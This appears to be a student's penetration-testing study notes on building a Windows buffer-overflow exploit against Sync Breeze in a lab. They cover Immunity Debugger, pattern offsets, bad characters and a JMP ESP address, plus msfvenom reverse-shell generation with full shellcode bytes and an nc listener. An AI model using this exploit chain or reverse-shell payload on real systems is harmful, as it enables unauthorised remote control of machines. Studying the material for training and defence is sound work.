---
title: Study Notes - 2021/03/17
date: 2021-03-16 22:56:46
tags: [Penetration Testing, Study Notes]
---

# Buffer Overflow
# Immunity Debug
F2 set break point  
F9 to run the program  
F7 step into the function  
Ctrl + F9 execute until the return of the function  


# Windows Buffer Overflows
## Discover the vulnerability 
1. source code review
2. reverse engineering 
3. fuzzing  

# Fuzzing the http protocal
## get seed
use wireshark to capture packages  
capture filter `host 192.168.119.148 and host 192.168.148.10`  
locate the /login page and right click `follow tcp stream`  -- apply display filters  


TCP View Stored at: `C:\Tools\windows_buffer_overflows`  find the process listening on port 80  
Run Immunity Debug with admin  

## Replicate the crash
## Control EIP
### Binary Search
AAAABBBB, then AAAABBCC then AAAABBCD until locate the eip  

generate non-repeat pattern  
`msf-pattern_create -l 800`  

eip replaced with `42306142`  -> `B0aB`  
```
└─$ msf-pattern_offset -l 800 -q 42306142                                                                          
[*] Exact match at offset 780
``` 

## Locating space for shell code  
usually shell code length 350 - 400 bytes  
esp locate at BBBBCCCCESP!  

```
filler = "A" * 780
eip = "B" * 4
offset = "C" * 4
buffer = "D" * (1500 - len(filler) - len(eip) - len(offset))
inputBuffer = filler + eip + offset + buffer
```  
esp point to buffer  

## checking for bad chars
`0x00`  use to terminate string  

```
badchars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )

inputBuffer = filler + eip + offset + badchars
```

right click esp, follow in dump: find that char after 0x09 not appear  means 0x0a is a bad char (line feed, terminate the http field)  

remove 0x0a from the barchar and repeat, find 0x0d (return char) is also bad  
all bad char `0x00, 0x0A, 0x0D, 0x25, 0x26, 0x2B 0x3D`   

## redirecting the execution flow
the address differ from crash to crash  
## find return address  
JMP ESP  
the addresses used in the library must be static, eliminates libraries compiled with ASLR support 
the **address** can not contain any bar char  

use !mona modules
```
Log data, item 7
 Address=0BADF00D
 Message= 0x00400000 | 0x00462000 | 0x00062000 | False  | False   | False |  False   | False  | -1.0- [syncbrs.exe] (C:\Program Files\Sync Breeze Enterprise\bin\syncbrs.exe)
```
however the address leading with `0x00`  
```
Log data, item 10
 Address=0BADF00D
 Message= 0x10000000 | 0x10223000 | 0x00223000 | False  | False   | False |  False   | False  | -1.0- [libspp.dll] (C:\Program Files\Sync Breeze Enterprise\bin\libspp.dll)
```
tip: If this application was compiled with DEP support, our JMP ESP
address would have to be located in the .text code segment of the module  

```
kali@kali:~$ msf-nasm_shell
nasm > jmp esp
00000000 FFE4 jmp esp
nasm >
```
`!mona find -s "\xff\xe4" -m "libspp.dll"`  

```
Log data, item 3
 Address=10090C83
 Message=  0x10090c83 : "\xff\xe4" |  {PAGE_EXECUTE_READ} [libspp.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\Sync Breeze Enterprise\bin\libspp.dll)
```

JMP ESP instruction (0x10090c83)  
eip = "\x83\x0c\x09\x10"  


## generate shell code with metasploit  
`msfvenom -l payloads`  list available playload  
`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.148 LPORT=443 -f c`  
-p payload  
-f to select C-formatted shellcode.  
```
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.148 LPORT=443 -f c                                     
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of c file: 1386 bytes
unsigned char buf[] = 
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
"\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c"
"\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
"\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68"
"\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xc0\xa8\x77\x94\x68"
"\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61"
"\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2"
"\x56\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6"
"\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01\x8d\x44"
"\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56"
"\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff"
"\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6"
"\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5";
```
include bad chars  

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.148 LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
```

-b bad char  
-e encoder  

the decoder (getPC routine) in the shell code modify the stack thus modify the decoder code it self.  

create landing path, add many nops (\x90) 

```
nops = "\x90" * 10
inputBuffer = filler + eip + offset + nops + shellcode
```

```
sudo nc -lnvp 443  
```

Yeah!!  

But when we exit the shell, the sync breeze crash and exit  


## improving the exploit  
Using ExitThread instead of ExitProcess
```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.148 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
```
